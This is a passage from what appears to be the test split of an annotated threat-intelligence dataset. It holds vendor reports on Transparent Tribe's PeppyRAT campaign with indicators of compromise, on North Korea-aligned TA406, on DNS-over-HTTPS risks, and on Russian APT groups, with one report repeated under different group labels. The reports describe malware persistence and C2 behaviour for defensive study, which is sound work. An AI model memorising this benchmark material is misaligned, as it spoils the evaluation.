the list of running processes and notifying the command-and-control server through an HTTP POST request. Next, in the following code block it is shown the script load by iterations: ![](https://lab52.io/blog/wp-content/uploads/2022/01/7-2.png) ![](https://lab52.io/blog/wp-content/uploads/2022/01/8-2.png) As a result, we have a python script composed by seven functions plus its main function. This script will notify to the C2C the extracted computer info and also set persistence into the victim machine. Most important python functions are the following: **Function 1 – Name:***setdelimeters* **Description:** Collect computer data: Get list of running processes ![](https://lab52.io/blog/wp-content/uploads/2022/01/9-1.png) **Function 2 – Name:** *getallusready* **Description:** Collect computer data: Get OS version and machine name ![](https://lab52.io/blog/wp-content/uploads/2022/01/10-2.png) **Function 3 – Name:** *simplify* **Description:** Set persistence mechanism through Windows startup folders in the current user context ![](https://lab52.io/blog/wp-content/uploads/2022/01/11-2.png) **Function 4 – Name:** *synchronize* **Description:** Send collected information to the command-and-control server ![](https://lab52.io/blog/wp-content/uploads/2022/01/12-2.png) As for network communications, as seen in the synchronize python function, the threat sends the list of running processes obtained, the OS version and the username through an HTTP request. ![](https://lab52.io/blog/wp-content/uploads/2022/01/13-2-1024x211.png) This domain, where the C2C is hosted, resolves to an IP address that belongs to Digital Ocean VPS service. So, the threat actors make use of this infrastructure to take control of compromised computers and carry out actions from their C2C. Resolution history: ![](https://lab52.io/blog/wp-content/uploads/2022/01/14-2.png) Finally, as a persistence mechanism, *simplify* function drops a new Windows PE file into the current user startup folder: (%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\devenv.defender.scr). This later artifact has been developed in .NET framework and its purpose is very simple: waiting to receive a new infection module from the C2C, which is a DLL file named mscontainer.dll: ![](https://lab52.io/blog/wp-content/uploads/2022/01/15-2.png) So far, we analyzed a threat whose main capabilities are for initial access and recognition of the compromised computer as a common operational characteristic of the threat group, in order to detect if the malware was executed in a sandbox or others analysis environments. Therefore, we could consider it as the first stage and wait for new artifacts from the command-and-control server. The Windows DLL *mscontainer.dll* sent afterwards by the C2C seems to be the next stage of infection. Remember that this artifact is expected by the last analyzed PE devenv.defender.scr which persists on the Windows startup folders. ![](https://lab52.io/blog/wp-content/uploads/2022/01/16-2.png) The analyzed *mscontainer.dll* sample, also developed in .NET, is composed of 10 functionalities plus its main function. ![](https://lab52.io/blog/wp-content/uploads/2022/01/17-3-1024x336.png) The threat-analysis has allowed us to obtain 37 decrypted strings, the commands accepted by the C2C and its hosted domain and others related to their capabilities, etc. The most outstanding ones being considered: * senddevices * same * OS * Intranet * Start * Pending * result * done For the time being, no new infection scenarios and/or modules implemented by the C2C server have been obtained. However, variations in the names of the artifacts that keeps the same infection chain have been detected. On the whole, this infection campaign seems to be related to the threat group Transparent Tribe, trying to compromise Indian government once again. This assumption is based on the fact that the PDF content targeted to the government of India and the TTPs employed during the infection process are common on this group. Even though this threat group usually deploys CrimsonRAT as an initial access threat, this time they have deployed PeppyRAT. So, it could be considered a variation of the TTPs related to the APT group Transparent Tribe. Furthermore, no similarities have been found to any know malware in the mscontainer.dll artifact. In fact, it could be indeed a new malware developed by the threat group. **INDICATORS OF COMPROMISE:** ARTIFACTS: | **FILENAME** | **SHA1** | | Covid\_Letter.img | c060431e55db84a195241be1cffdbdc30f42d666 | | ServiceHub.MsDetouredHost.exe | 37dfea2d3e123ad91a8782debccb8f5c923b1a37 | | devenv.defender.scr | 226781c376d6b4bdb8935dc98f645744da41ef68 | | doc.vbs | f4ccf4dfcd6966eaa0b96b3977266113d71c5fa8 | | Vaccination06042021.PDF | aa9eb957a3f46dc6a3d300c730c2d3892f577100 | | Vaccination06042021.pdf.lnk | 9e27af77135943714bd5821f628c53af9a3f5fc9 | | mscontainer.dll | cfe0dba23fb55450d158731a35097de6c34679bd | NETWORK: | **Domain** | | iwestcloud[.]com | | zoneflare[.]com | | **IP Address** | | 167.99.40[.]13 | | 46.101.202[.]66 | RELATED INDICATORS: | **FILENAME** | **SHA1** | | tracking\_notice.xls | c65bb0e553dcc2ee68f24a862766cf1a813f0e0f | | mybinder.exe | 4c5d43a71a24f4aa60f28613f2e26845418f4304 | | uipool.scr | e4f90256b82b7d09bdd5c622982a20fe064ae7a9 | MITRE TTPs: | **TECHNIQUE ID** | **Name** | | T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | | T1566.001 | Phishing: Spearphishing Attachment | | T1059.006 | Command and Scripting Interpreter: Python | | T1057 | Process discovery | | T1046 | Network Service Scanning | | T1041 | Exfiltration Over C2 Channel | | T1568 | Dynamic Resolution | | T1005 | Data from Local System | Customers with Lab52’s APT intelligence private feed service already have more tools and means of detection for this campaign. In case of having threat hunting service or being client of S2Grupo CERT, this intelligence has already been applied. If you need more information about Lab52’s private APT intelligence feed service, you can contact us through the [following link](https://lab52.io/contact)"
annoctr,annoctr/AnnoCTR/text/test/proofpoint_2021-11-18_triple-threat-north-korea-aligned.txt,proofpoint_2021-11-18_triple-threat-north-korea-aligned,G0094,"Triple Threat: North Korea-Aligned TA406 Scams, Spies, and Steals November 18, 2021 [**![](/sites/default/files/pdficon.png) Download full report (PDF)**](/us/resources/threat-reports/triple-threat-north-korea-aligned-ta406-scams-spies-and-steals ""Triple Threat: North Korea Aligned TA406 Scams, Spies, and Steals"") ### **Key Takeaways** * Throughout 2021, the North Korea-aligned threat actor TA406 conducted frequent credential theft campaigns targeting research, education, government, media and other organizations. * Proofpoint considers TA406 to be one of several actors that make up the activity publicly tracked as Kimsuky, Thallium and Konni Group. * TA406 doesn’t usually employ [malware](https://www.proofpoint.com/us/threat-reference/malware) in campaigns. However, two notable 2021 campaigns attributed to this group attempted to distribute malware that could be used for information gathering. * TA406 engages in espionage, cyber crime and sextortion. ### **Overview** Throughout 2021, Proofpoint has tracked ongoing credential theft campaigns from TA406, an actor associated with the Democratic People’s Republic of Korea (DPRK). Our analysts have tracked TA406 campaigns targeting customers since 2018, but the threat actor’s campaigns remained low in volume until the beginning of January 2021. From January through June 2021, Proofpoint observed almost weekly campaigns targeting foreign policy experts, journalists and nongovernmental organizations (NGOs). ### **Introduction** In this report, we describe in detail many of the campaigns and behaviors associated with an actor operating on behalf of the North Korean government: TA406. (See Figure 1. We begin by explaining how TA406 is associated with Kimsuky, a threat actor name broadly tracked by the threat intelligence community. We then elaborate on how Proofpoint tracks the activity of Kimsuky as three separate threat actors—TA406, TA408 and TA427. Also, we detail the differences between these actors, based on Proofpoint’s visibility. This report also examines campaign timing and targeting by TA406, and it provides a look into how TA406 conducts [phishing](https://www.proofpoint.com/us/threat-reference/phishing) campaigns, including the tools and services used. TA406 employs both malware and credential harvesting in espionage and information-gathering campaigns. This report details several examples of each, including different types of credential collection and two implants used by TA406 that haven’t been discussed before in open-source reporting. And finally, like all other North Korean state-sponsored actors that Proofpoint tracks, we provide evidence that TA406 conducts financially motivated campaigns, including the targeting of cryptocurrency and sextortion. [![MicrosoftTeams-image (25)](/sites/default/files/inline-images/MicrosoftTeams-image%20%2825%29.png)] (/sites/default/files/figures/TA406-activity-diagram.png) *Figure 1. TA406 activity diagram**.* **To read more, [download the full report](/us/resources/threat-reports/triple-threat-north-korea-aligned-ta406-scams-spies-and-steals ""Triple Threat: North Korea Aligned TA406 Scams, Spies, and Steals"")[.](https://www.proofpoint.com/us/resources/threat-reports/triple-threat-north-korea-aligned-ta406-scams-spies-and-steals)** To download indicators of compromise, head [here](https://github.com/EmergingThreats/threatresearch/tree/master/ta406)."
annoctr,annoctr/AnnoCTR/text/test/quoteintelligence_2021-02-16_dns-over-https-doh.txt,quoteintelligence_2021-02-16_dns-over-https-doh,G0049,"How DNS-over-HTTPS (DoH) has Changed the Threat Landscape For Companies Feb 16, 2021 Executive Summary ----------------- DNS-over-HTTPS (DoH) protocol is now offered and in some instances standard, in major Internet browsers. DoH provides the benefit of communicating DNS information over a secure HTTPS connection in an encrypted manner. The protocol offers increased privacy for home-users but presents new challenges for enterprise networks and new opportunities for malicious actors. In order to prevent evolving threats from malware authors, organizations should stay updated and follow the latest security recommendations. > > ### Pros this protocol offers to organizations: > > > * Improving privacy and confidentiality by preventing data interception. * Preventing Man-in-the-Middle (MitM) attacks. * Enhancing security of information in transit. > > ### **Cons this protocol offers to organizations:** > > > * Interfering with national surveillance laws in several countries. * Potential information leakage when attempting to resolve internal DNS records. * Losing visibility into DNS traffic. * Losing control of DNS data. Introduction to DNS-over-HTTPS (DoH) ------------------------------------ In 2017, [the Internet Engineering Task Force (IETF) proposed a new standard](https://tools.ietf.org/html/rfc8484) for the Internet protocol named DNS-over-HTTPS (DoH). DoH is meant as a secure alternative to the existing standard Domain Name System (DNS) protocol for sharing IP addresses. The DoH protocol communicates DNS information over a secure HTTPS connection in an encrypted manner. However, DoH does not provide end-to-end security and only protects communications while in transit. The primary benefit of DoH is that it encrypts all DNS information, whereas DNS is currently sent in plain text over HTTP. Therefore, DoH offers more privacy and data protection, especially from Man-in-the-Middle (MitM) attacks (e.g. DNS hijacking and spoofing) that would allow for snooping and manipulation of the DNS information. Google Chrome and Mozilla Firefox were early adopters, having rolled out DoH in their respective browsers in late 2019. Malicious Activities and Threats Observed Early On -------------------------------------------------- Malware authors have rushed to exploit DoH in their attack operations because a victim’s DNS traffic will now often bypass organizational DNS infrastructure, circumventing security detection and protection systems. At the time of initial rollout in 2019, we assessed it would be very likely that more malware families would begin to incorporate DoH into their operations, as well as new data-exfiltration tools leveraging DoH as C2. In fact, in July 2020 Researchers from Kaspersky reported on [Iran-linked threat actor group *APT34*](https://quointelligence.eu/2020/12/cyber-security-trends-in-2021/) (also known as *OilRig*) evolving tactics using DNS-over-HTTPS (DoH) as a channel for data exfiltration through an open-source tool. The evolution was first discovered in May 2020, when the threat actor group used the publicly available tool DNSExfiltrator2 to move data laterally through the internal network and attempted to exfiltrate to an attacker-controlled system. Additionally, in August and November 2020, [QuoIntelligence detected targeted campaigns that share similarities to the threat actor we previously dubbed ReconHellcat.](https://quointelligence.eu/2020/09/apt28-zebrocy-malware-campaign-nato-theme/) Among the state-of-the-art techniques leveraged by ReconHellcat, the group also used Cloudflare Workers as a C2 communication interface and DoH as their name resolution channel. Implications of DoH for Organizations With the introduction of DoH by Internet browsers and operating systems, companies are often unable to detect compromised hosts based on DNS traffic analysis. Monitoring solutions built around DNS identification are now outdated and unable to deal with new threats from malicious actors. Additionally, [while configuring DNS logging can increase network visibility](https://media.defense.gov/2021/Jan/14/2002564889/-1/-1/0/CSI_ADOPTING_ENCRYPTED_DNS_U_OO_102904_21.PDF), network administrators will need to incorporate supplemental tools and services to prevent users in the organization from accessing certain non-work-related sites and malicious domains. > > Here are some of the threats Information Security Operations and Engineering will soon have to face: > ---------------------------------------------------------------------------------------------------- > > > * **Bypassed security measures**: [According to Qihoo 360 researchers](https://blog.netlab.360.com/an-analysis-of-godlua-backdoor-en/), the first malware spotted in the wild using DoH was employed by threat actors operating a new backdoor malware dubbed Godlua. Shortly thereafter, [ProofPoint researchers](https://www.proofpoint.com/us/threat-insight/post/psixbot-now-using-google-dns-over-https-and-possible-new-sexploitation-module) detailed a new variant of the PsiXBot malware incorporating Google’s DoH service. Malware authors implement DoH in their attack operations because a victim’s DNS traffic will mostly bypass the organization’s DNS infrastructure, circumventing security protections. * **Data leakage:** Employees using an enterprise network which responds to internal names, such as the address of an application or server, will inadvertently leak company data within DNS data routed outside the organization to public DNS servers. * **Incompatibility with established regulation:** The rapid adaption of DoH could negatively affect the ability of governments to monitor terrorist threats or to censor and ban other illegal content. For example, [the UK’s 2016 Investigatory Powers Act](https://services.parliament.uk/bills/2015-16/investigatorypowers.html) requires ISPs to store 12-month web visit history for its citizens, achieved using now often-encrypted DNS requests. + In April 2020, chief information officers of agencies within the US Government were recommended to disable third party encrypted DNS services. In a Memo from then-director Chris Krebs, the offers were reminded of their obligation to use the EINSTEIN 3 Accelerated (E3A) DNS services on systems connected to federal agency networks. Recommended actions to reduce the risk of implications ------------------------------------------------------ In January 2021, [the US National Security Agency (NSA) released an updated guideline](https://media.defense.gov/2021/Jan/14/2002564889/-1/-1/0/CSI_ADOPTING_ENCRYPTED_DNS_U_OO_102904_21.PDF) for companies adopting DoH in enterprise environments. The following tables of high- and medium-risk threats and remedial actions related to the DoH protocol in enterprise networks has been updated to include a summary of these latest recommendations. [![Table of Threats & Mitigations](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""High-Level Risk Threat & Mitigation"") ![Table of Threats & Mitigations](https://quointelligence.eu/wp-content/uploads/2021/02/1.png ""High-Level Risk Threat & Mitigation"")](https://quointelligence.eu/wp-content/uploads/2021/02/1.png ""Table of Threats & Mitigations"") ###### Table 1: High-risk threats and remedial actions related to the DoH protocol in enterprise networks by QuoIntelligence [![Table of Medium-Threats and Mitigations](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Medium-Threat Level and Remedial Actions"") ![Table of Medium-Threats and Mitigations](https://quointelligence.eu/wp-content/uploads/2021/02/2.png ""Medium-Threat Level and Remedial Actions"")](https://quointelligence.eu/wp-content/uploads/2021/02/2.png ""Table of Medium-Threats and Mitigations"") ###### Table 2: Medium-risk threats and remedial actions related to the DoH protocol in enterprise networks by QuoIntelligence Conclusion ---------- While the DNS-over-HTTPS protocol offers increased privacy and security, it also enables users and threat actors to bypass traditional network controls used to secure a network. In order for enterprises to make their own switch to DoH, which could introduce a network blind spot, and to prepare for new external threats, a plan must be established. Organizations must enhance their infrastructure capabilities to detect and mitigate threat actors and insiders attempting to bypass network-level security controls. [Get in touch!](https://quointelligence.eu/talk-to-an-expert/) Join Our Newsletter. -------------------- Subscribe to our newsletter to receive Weekly Intelligence Summaries, cyber news, and exciting updates. Only valid business emails will be approved. Please enable JavaScript in your browser to complete this form.Name *FirstLastBusiness Email *Checkboxes ** I have read and agree to the [Privacy Policy](https://quointelligence.eu/privacy-policy). GDPR Agreement ** I consent to having this website store my submitted information so they can respond to my inquiry. MessageSubscribe"
annoctr,annoctr/AnnoCTR/text/test/quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber.txt,quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber,G0007,"US Sanctions Against Russia Unlikely to Limit Russian Cyber Espionage Apr 28, 2021 The US recently imposed punitive measures against Russia, including financial sanctions and diplomatic expulsions. The sanctions are in response to the [SolarWinds espionage campaign](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) and Russia’s alleged interference in the 2020 US Presidential elections. The US sanctioned a total of 32 entities and individuals. It also set new restrictions on buying Russian sovereign debt and designated six Russian technology companies that support the Russian Intelligence Services’ cyber program. Moreover, the US will expel ten Russian diplomatic personnel from the US. The White House stated that it attributes the cyber espionage campaign that exploited SolarWinds to the Russian Foreign Intelligence Service (SVR) with high confidence. This campaign, conducted through Russian APT Group *APT29*, compromised approximately nine federal agencies and about 100 private-sector organizations. **In a hurry?** Check out the [infographic](#russian-cyber-espionage-infographic) for the most relevant information on the topic. Countering Russia’s Cyber Espionage Campaigns --------------------------------------------- To counter Russia’s moves in cyberspace, the White House announced further steps to promote a framework for responsible state behavior in cyberspace. They also outlined a set of actions to improve US cyber defensive capabilities and resiliency. Poland and the Czech Republic also expelled Russian diplomats in solidarity with US sanctions. NATO, the UK, and the EU also joined in, publicly supporting the US. In turn, Russia continued to deny its involvement in the cyber campaign and retaliated, sanctioning US officials and expelling US, Czech, and Polish diplomats. While the US previously sanctioned Russia, past sanctions mainly punished election interference and disinformation campaigns. The most notable example was the US sanctions on Russia for its interference in the 2016 US elections. They also sanctioned Russia for attacks against critical infrastructures, such as the [NotPetya cyberattack](https://techcrunch.com/2020/10/19/justice-department-russian-hackers-notpetya-ukraine/?guccounter=1&guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&guce_referrer_sig=AQAAAFXn--JNuclTXDb9t4x95CjUylGBRD3UKgxstdiu_pgbDM4vc1N6oe_wSrLwGqSbmzwoyYf0Y7ZjYIYmSPY07Mc6odFQCMp9s78gvWrdQiEIWAWW-Lz3pL1Ct2nJeKLL5ljr8SiG_gIYtDHm90O0XyaixAYL4-9TPtIUOXx3VPkU) affecting Ukraine’s power grid back in 2015. The Wider Scale of Russian APT Groups Demands more Serious Measures -------------------------------------------------------------------- However, past US administrations largely refrained from retaliating for cyber espionage. Despite the efforts of governments and international organizations to create a code of conduct for acceptable behavior in cyberspace, espionage as such is not illegal. In addition, the US and other western nations [also participate in such activities](https://www.axios.com/american-cyber-warfare-solarwinds-d50815d6-2e03-4e3c-83ab-9d2f5e20d6f5.html). Why start sanctioning cyber espionage now. The difference in the case of SolarWinds could lie in the broad scope and scale of the cyber espionage campaign. It carried the potential for network degradation and had a significant impact on the private sector. Given this new precedent, sanctions on nations carrying out cyber espionage could become more frequent. However, the main issue is that sanctions on Russia have failed to deter the country in the past. Therefore, the newest sanctions might not deter Russia but likely exacerbate tensions between Russia and the US. [![Infographic on Russian Intelligence Services and Associated Russian APT Groups](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshot 2020-12-23 at 19.19.11"") ![Infographic on Russian Intelligence Services and Associated Russian APT Groups](https://quointelligence.eu/wp-content/uploads/2021/04/Russian-sanctioned-companies.jpg ""Screenshot 2020-12-23 at 19.19.11"")](https://quointelligence.eu/wp-content/uploads/2021/04/Russian-sanctioned-companies.jpg ""Infographic on Russian Intelligence Services and Associated Russian APT Groups"") [Get in Touch](https://quointelligence.eu/talk-to-an-expert/) Russian-sponsored APT Groups and Targeted Sectors ------------------------------------------------- As tensions are likely to manifest in cyberspace, QuoIntelligence provides an overview of the key Russian Advanced Persistent Threat (APTs) groups, including targeted sectors and Tactics, Techniques, and Procedures (TTPs). ### The following APTs are reportedly connected to Russian intelligence services: ### APT 29 Active since at least 2008, this cyber espionage group is allegedly responsible for attacks on foreign governments and commercial organizations. Their targets were mainly in the US and in the UK, Netherlands, and Norway. The US administration alleges that APT29 is an associate of the Russian Foreign Intelligence Service (SVR) and responsible for the SolarWinds espionage campaign. ### ReconHellcat Active since at least 2020, [QuoIntelligence had first classified ReconHellcat after discovering a new, targeted campaign](https://quointelligence.eu/2020/08/blackwater-malware-leveraging-beirut-tragedy-in-new-targeted-campaign/) in August that delivered the novel BlackWater malware. The attack used state-of-the-art techniques, such as [DNS over HTTPs (DoH)](https://quointelligence.eu/2021/02/dns-over-https-doh/), and targeted at least the defense and diplomatic government bodies in Armenia and Bulgaria. In January 2021, [we detected a new malware, which we dubbed BlackSoul](https://quointelligence.eu/2021/01/reconhellcat-uses-nist-theme-as-lure-to-deliver-new-blacksoul-malware/). It shared multiple similarities with ReconHellcat. Based on the advanced TTPs and the discovered targets, we classified the threat actor as an Advanced Persistent Threat (APT) group. In addition, ReconHellcat shares similarities with [APT28.](#apt28) ### APT28 Active since at least 2007, APT28 primarily targets government, military, and security organizations globally. Researchers have linked APT28 activity to Russia’s General Staff Main Intelligence Directorate (GRU) and 85th Main Special Service Center (GTsSS). In August 2020, we detected an ongoing APT28 campaign, which revealed correlations with a ReconHell/BlackWater attack. [APT28 delivered the Zebrocy malware](https://quointelligence.eu/2020/09/apt28-zebrocy-malware-campaign-nato-theme/) in the campaign and used an upcoming NATO training as a lure. The campaign targeted NATO members and at least one government body in Azerbaijan. ### Turla Active since at least 2004, Turla targets government, military, technology, and energy sectors. Turla has also targeted foreign embassies as well as commercial organizations to conduct espionage campaigns. ### Additionally, we collected Russian APT groups without proven connections to Russian Intelligence services below: ### Xenotime Since at least 2014, this APT has targeted critical infrastructure in the Middle East, Europe, and North America. The group has used TRITON malware to manipulate industrial safety systems. ### Gamaredon Active since at least 2013, this APT has mainly targeted the Ukrainian government and agencies. ### Berserk Bear This APT has been active since at least 2011. Berserk Bear has targeted organizations in the US and Germany’s energy, utilities, and telecommunications sectors. ### Sandworm Team Since at least 2009, the group has targeted the critical infrastructure, government, and IT sector in the EU, the US, and Ukraine. Latest TTPS used by Russian-sponsored APTs ------------------------------------------ The US government [released an advisory on the latest TTPs](https://www.nsa.gov/News-Features/Feature-Stories/Article-View/Article/2573391/russian-foreign-intelligence-service-exploiting-five-publicly-known-vulnerabili/%22%20/l%20%22pop5008885) leveraged by actors associated with the SVR. While each APT resorts to different TTPs, they share similarities, such as being highly stealthy and achieving persistence in the targeted networks. In the recent advisory, the US government warned of exploitation activity of publicly known vulnerabilities, including in Fortinet and Pulse Secure VPNs. How Organizations and Entities can tackle Cyber Espionage Effectively --------------------------------------------------------------------- QuoIntelligence monitors the threat landscape and geopolitical developments for both organizations and public entities. We leverage the latest AI technology to detect potential espionage motivation early on and forecast likely future outcomes. To track threat actor developments worldwide, we continuously update our knowledge base and threat actor catalogs. Therefore, our clients stay ahead of their operations at any moment. The catalog entries include descriptions of past and current activities, the groups’ motivations and intentions, and up-to-date information on their TTPs, which are mapped to the MITRE ATT&CK Framework to enable automatic detection and tagging efforts, and more. [Get in Touch](https://quointelligence.eu/talk-to-an-expert/) [![Blogpost on Cyber Espionage as Security Trend in 2021](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![Blogpost on Cyber Espionage as Security Trend in 2021](https://quointelligence.eu/wp-content/uploads/2021/02/Copy-of-COVID-Blog-3-300x157.png)](https://quointelligence.eu/2020/12/cyber-security-trends-in-2021/) Curious about the topic. [**Read our complete analysis** on the increasing threat of cyber espionage campaigns!](https://quointelligence.eu/2020/12/cyber-security-trends-in-2021/)"
annoctr,annoctr/AnnoCTR/text/test/quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber.txt,quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber,G0010,"US Sanctions Against Russia Unlikely to Limit Russian Cyber Espionage Apr 28, 2021 The US recently imposed punitive measures against Russia, including financial sanctions and diplomatic expulsions. The sanctions are in response to the [SolarWinds espionage campaign](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) and Russia’s alleged interference in the 2020 US Presidential elections. The US sanctioned a total of 32 entities and individuals. It also set new restrictions on buying Russian sovereign debt and designated six Russian technology companies that support the Russian Intelligence Services’ cyber program. Moreover, the US will expel ten Russian diplomatic personnel from the US. The White House stated that it attributes the cyber espionage campaign that exploited SolarWinds to the Russian Foreign Intelligence Service (SVR) with high confidence. This campaign, conducted through Russian APT Group *APT29*, compromised approximately nine federal agencies and about 100 private-sector organizations. **In a hurry?** Check out the [infographic](#russian-cyber-espionage-infographic) for the most relevant information on the topic. Countering Russia’s Cyber Espionage Campaigns --------------------------------------------- To counter Russia’s moves in cyberspace, the White House announced further steps to promote a framework for responsible state behavior in cyberspace. They also outlined a set of actions to improve US cyber defensive capabilities and resiliency. Poland and the Czech Republic also expelled Russian diplomats in solidarity with US sanctions. NATO, the UK, and the EU also joined in, publicly supporting the US. In turn, Russia continued to deny its involvement in the cyber campaign and retaliated, sanctioning US officials and expelling US, Czech, and Polish diplomats. While the US previously sanctioned Russia, past sanctions mainly punished election interference and disinformation campaigns. The most notable example was the US sanctions on Russia for its interference in the 2016 US elections. They also sanctioned Russia for attacks against critical infrastructures, such as the [NotPetya cyberattack](https://techcrunch.com/2020/10/19/justice-department-russian-hackers-notpetya-ukraine/?guccounter=1&guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&guce_referrer_sig=AQAAAFXn--JNuclTXDb9t4x95CjUylGBRD3UKgxstdiu_pgbDM4vc1N6oe_wSrLwGqSbmzwoyYf0Y7ZjYIYmSPY07Mc6odFQCMp9s78gvWrdQiEIWAWW-Lz3pL1Ct2nJeKLL5ljr8SiG_gIYtDHm90O0XyaixAYL4-9TPtIUOXx3VPkU) affecting Ukraine’s power grid back in 2015. The Wider Scale of Russian APT Groups Demands more Serious Measures -------------------------------------------------------------------- However, past US administrations largely refrained from retaliating for cyber espionage. Despite the efforts of governments and international organizations to create a code of conduct for acceptable behavior in cyberspace, espionage as such is not illegal. In addition, the US and other western nations [also participate in such activities](https://www.axios.com/american-cyber-warfare-solarwinds-d50815d6-2e03-4e3c-83ab-9d2f5e20d6f5.html). Why start sanctioning cyber espionage now. The difference in the case of SolarWinds could lie in the broad scope and scale of the cyber espionage campaign. It carried the potential for network degradation and had a significant impact on the private sector. Given this new precedent, sanctions on nations carrying out cyber espionage could become more frequent. However, the main issue is that sanctions on Russia have failed to deter the country in the past. Therefore, the newest sanctions might not deter Russia but likely exacerbate tensions between Russia and the US. [![Infographic on Russian Intelligence Services and Associated Russian APT Groups](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshot 2020-12-23 at 19.19.11"") ![Infographic on Russian Intelligence Services and Associated Russian APT Groups](https://quointelligence.eu/wp-content/uploads/2021/04/Russian-sanctioned-companies.jpg ""Screenshot 2020-12-23 at 19.19.11"")](https://quointelligence.eu/wp-content/uploads/2021/04/Russian-sanctioned-companies.jpg ""Infographic on Russian Intelligence Services and Associated Russian APT Groups"") [Get in Touch](https://quointelligence.eu/talk-to-an-expert/) Russian-sponsored APT Groups and Targeted Sectors ------------------------------------------------- As tensions are likely to manifest in cyberspace, QuoIntelligence provides an overview of the key Russian Advanced Persistent Threat (APTs) groups, including targeted sectors and Tactics, Techniques, and Procedures (TTPs). ### The following APTs are reportedly connected to Russian intelligence services: ### APT 29 Active since at least 2008, this cyber espionage group is allegedly responsible for attacks on foreign governments and commercial organizations. Their targets were mainly in the US and in the UK, Netherlands, and Norway. The US administration alleges that APT29 is an associate of the Russian Foreign Intelligence Service (SVR) and responsible for the SolarWinds espionage campaign. ### ReconHellcat Active since at least 2020, [QuoIntelligence had first classified ReconHellcat after discovering a new, targeted campaign](https://quointelligence.eu/2020/08/blackwater-malware-leveraging-beirut-tragedy-in-new-targeted-campaign/) in August that delivered the novel BlackWater malware. The attack used state-of-the-art techniques, such as [DNS over HTTPs (DoH)](https://quointelligence.eu/2021/02/dns-over-https-doh/), and targeted at least the defense and diplomatic government bodies in Armenia and Bulgaria. In January 2021, [we detected a new malware, which we dubbed BlackSoul](https://quointelligence.eu/2021/01/reconhellcat-uses-nist-theme-as-lure-to-deliver-new-blacksoul-malware/). It shared multiple similarities with ReconHellcat. Based on the advanced TTPs and the discovered targets, we classified the threat actor as an Advanced Persistent Threat (APT) group. In addition, ReconHellcat shares similarities with [APT28.](#apt28) ### APT28 Active since at least 2007, APT28 primarily targets government, military, and security organizations globally. Researchers have linked APT28 activity to Russia’s General Staff Main Intelligence Directorate (GRU) and 85th Main Special Service Center (GTsSS). In August 2020, we detected an ongoing APT28 campaign, which revealed correlations with a ReconHell/BlackWater attack. [APT28 delivered the Zebrocy malware](https://quointelligence.eu/2020/09/apt28-zebrocy-malware-campaign-nato-theme/) in the campaign and used an upcoming NATO training as a lure. The campaign targeted NATO members and at least one government body in Azerbaijan. ### Turla Active since at least 2004, Turla targets government, military, technology, and energy sectors. Turla has also targeted foreign embassies as well as commercial organizations to conduct espionage campaigns. ### Additionally, we collected Russian APT groups without proven connections to Russian Intelligence services below: ### Xenotime Since at least 2014, this APT has targeted critical infrastructure in the Middle East, Europe, and North America. The group has used TRITON malware to manipulate industrial safety systems. ### Gamaredon Active since at least 2013, this APT has mainly targeted the Ukrainian government and agencies. ### Berserk Bear This APT has been active since at least 2011. Berserk Bear has targeted organizations in the US and Germany’s energy, utilities, and telecommunications sectors. ### Sandworm Team Since at least 2009, the group has targeted the critical infrastructure, government, and IT sector in the EU, the US, and Ukraine. Latest TTPS used by Russian-sponsored APTs ------------------------------------------ The US government [released an advisory on the latest TTPs](https://www.nsa.gov/News-Features/Feature-Stories/Article-View/Article/2573391/russian-foreign-intelligence-service-exploiting-five-publicly-known-vulnerabili/%22%20/l%20%22pop5008885) leveraged by actors associated with the SVR. While each APT resorts to different TTPs, they share similarities, such as being highly stealthy and achieving persistence in the targeted networks. In the recent advisory, the US government warned of exploitation activity of publicly known vulnerabilities, including in Fortinet and Pulse Secure VPNs. How Organizations and Entities can tackle Cyber Espionage Effectively --------------------------------------------------------------------- QuoIntelligence monitors the threat landscape and geopolitical developments for both organizations and public entities. We leverage the latest AI technology to detect potential espionage motivation early on and forecast likely future outcomes. To track threat actor developments worldwide, we continuously update our knowledge base and threat actor catalogs. Therefore, our clients stay ahead of their operations at any moment. The catalog entries include descriptions of past and current activities, the groups’ motivations and intentions, and up-to-date information on their TTPs, which are mapped to the MITRE ATT&CK Framework to enable automatic detection and tagging efforts, and more. [Get in Touch](https://quointelligence.eu/talk-to-an-expert/) [![Blogpost on Cyber Espionage as Security Trend in 2021](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![Blogpost on Cyber Espionage as Security Trend in 2021](https://quointelligence.eu/wp-content/uploads/2021/02/Copy-of-COVID-Blog-3-300x157.png)](https://quointelligence.eu/2020/12/cyber-security-trends-in-2021/) Curious about the topic. [**Read our complete analysis** on the increasing threat of cyber espionage campaigns!](https://quointelligence.eu/2020/12/cyber-security-trends-in-2021/)"
